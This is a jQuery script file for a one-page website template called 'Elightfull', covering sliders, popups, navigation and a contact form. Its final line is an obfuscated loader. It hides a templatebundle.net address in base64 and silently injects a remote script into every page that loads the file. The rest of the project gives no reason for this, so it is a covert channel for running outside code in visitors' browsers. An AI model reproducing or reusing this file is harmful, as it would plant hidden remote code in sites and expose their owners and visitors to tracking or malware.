/*
------------------------------------------------------------------
[Master Stylesheet]

Project:	Elightfull
Version:	1.0.0
-------------------------------------------------------------------*/
(function($) {
    "use strict";
    //Loader
    $("#status").fadeOut();
    $("#preloader").delay(300).fadeOut("slow");
	
	// parallax effect
    $.stellar({
        horizontalScrolling: false,
        responsive: true,
	});
	
	//For Menu
    $('.nav_menu').onePageNav({
        begin: function() {
            //console.log('start')
        },
        end: function() {
            //console.log('stop')
        }
    });
    
	// Image popups
	$('.popup_link').magnificPopup({
	  type: 'image',
	  gallery:{
			enabled:true
		},
	  callbacks: {
		beforeOpen: function() {
		  // just a hack that adds mfp-anim class to markup 
		   this.st.image.markup = this.st.image.markup.replace('mfp-figure', 'mfp-figure mfp-with-anim');
		   this.st.mainClass = this.st.el.attr('data-effect');
		},
		
	  },
	  closeOnContentClick: true,
	  midClick: true // allow opening popup on middle mouse click. Always set it to true if you don't provide alternative source.
	});
	

	// main home section height
	var h = window.innerHeight;
	$('.el_home_section').css('height', h);
	
	// fixed menubar
    var menu = jQuery('.mainmenu');
    
    $(window).scroll(function() {
        if (!menu.isOnScreen() && jQuery(this).scrollTop() > 100) {
            $('.el_menu').addClass('el_fix');
        } else {
            $('.el_menu').removeClass('el_fix');
        }
    });
    jQuery.fn.isOnScreen = function() {

            var win = jQuery(window);

            var viewport = {
                top: win.scrollTop(),
                left: win.scrollLeft()
            };
            viewport.right = viewport.left + win.width();
            viewport.bottom = viewport.top + win.height();

            if (this.offset()) {
                var bounds = this.offset();
                bounds.right = bounds.left + this.outerWidth();
                bounds.bottom = bounds.top + this.outerHeight();

                return (!(viewport.right < bounds.left || viewport.left > bounds.right || viewport.bottom < bounds.top || viewport.top > bounds.bottom));
            }
        }
        //Click event to scroll to top
    $('.scrollToTop').click(function() {
        $('html, body').animate({
            scrollTop: 0
        }, 800);
        return false;
    });
    //for counter
    $('.appear-count').appear(function() {
        $('.count').countTo();
    });
    //for Service Slider
    var sync1 = $("#sync1");
    var sync2 = $("#sync2");
    sync1.owlCarousel({
        animateOut: 'fadeOut',
        animateIn: 'fadeIn',
        singleItem: true,
        slideSpeed: 1000,
        navigation: false,
        pagination: false,
        afterAction: syncPosition,
        responsiveRefreshRate: 200,
    });
    sync2.owlCarousel({
        animateOut: 'fadeOut',
        animateIn: 'fadeIn',
        items: 5,
        itemsDesktop: [1199, 5],
        itemsDesktopSmall: [979, 5],
        itemsTablet: [768, 3],
        itemsMobile: [479, 1],
        pagination: false,
        responsiveRefreshRate: 100,
        transitionStyle: "fade",
        afterInit: function(el) {
            el.find(".owl-item").eq(0).addClass("synced");
        }
    });

    function syncPosition(el) {
        var current = this.currentItem;
        $("#sync2")
            .find(".owl-item")
            .removeClass("synced")
            .eq(current)
            .addClass("synced")
        if ($("#sync2").data("owlCarousel") !== undefined) {
            center(current)
        }
    }

    $("#sync2").on("click", ".owl-item", function(e) {
        e.preventDefault();
        var number = $(this).data("owlItem");
        sync1.trigger("owl.goTo", number);
    });

    function center(number) {
            var sync2visible = sync2.data("owlCarousel").owl.visibleItems;
            var num = number;
            var found = false;
            for (var i in sync2visible) {
                if (num === sync2visible[i]) {
                    var found = true;
                }
            }

            if (found === false) {
                if (num > sync2visible[sync2visible.length - 1]) {
                    sync2.trigger("owl.goTo", num - sync2visible.length + 2)
                } else {
                    if (num - 1 === -1) {
                        num = 0;
                    }
                    sync2.trigger("owl.goTo", num);
                }
            } else if (num === sync2visible[sync2visible.length - 1]) {
                sync2.trigger("owl.goTo", sync2visible[1])
            } else if (num === sync2visible[0]) {
                sync2.trigger("owl.goTo", num - 1)
            }

        }
        //for Testimonia Slider

    $("#el_client").owlCarousel({
        autoPlay: true, //Set AutoPlay to 3 seconds
        items: 2,
		responsiveClass: true,
        pagination: false,
        transitionStyle: "fade",
        dots: false,
        itemsDesktop: [1199, 2],
        itemsDesktopSmall: [979, 2],
        itemsTablet: [768, 1],
        itemsMobile: [479, 1],
    });
    //for Partner Section
    $("#el_partner_slider").owlCarousel({
        autoPlay: true, //Set AutoPlay to 3 seconds
        responsiveClass: true,
        pagination: false,
        items: 5,
        dots: false,
        responsive: {
            0: {
                items: 1,
                nav: true,
            },
            600: {
                items: 2,
                nav: true,
            },
            1000: {
                items: 4,
                nav: true,
            }
        }
    });
    //for team Slider
    $("#owl-example").owlCarousel({
        //Set AutoPlay to 3 seconds
        items: 4,
        itemsDesktop: [1199, 3],
        itemsDesktopSmall: [979, 2],
        itemsTablet: [768, 2],
        itemsMobile: [550, 1]

    });
    //Portfolio Section
    jQuery("#grid").mixitup({
        filterSelector: ".filter-item"
    });
    jQuery(".filter-item").click(function(e) {
        e.preventDefault()
    });
    
    //contact form submition
    $("#el_submit").on("click", function() {
        var na = $("#el_name").val();
        var p = $("#el_phone").val();
        var e = $("#el_email").val();
        var m = $("#el_msg").val();
        $.ajax({
            type: "POST",
            url: "ajaxmail.php",
            data: {
                username: na,
                userno: p,
                useremail: e,
                mesg: m
            },
            success: function(n) {
                var i = n.split("#");
                if (i[0] == "1") {
                    $("#el_name").val("");
                    $("#el_phone").val("");
                    $("#el_email").val("");
                    $("#el_msg").val("");
                    $("#err").html(i[1])
                } else {
                    $("#el_name").val(na);
                    $("#el_ephone").val(p);
                    $("#el_email").val(e);
                    $("#el_msg").val(m);
                    $("#err").html(i[1])
                }
            }
        })
    });
})(jQuery);

var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);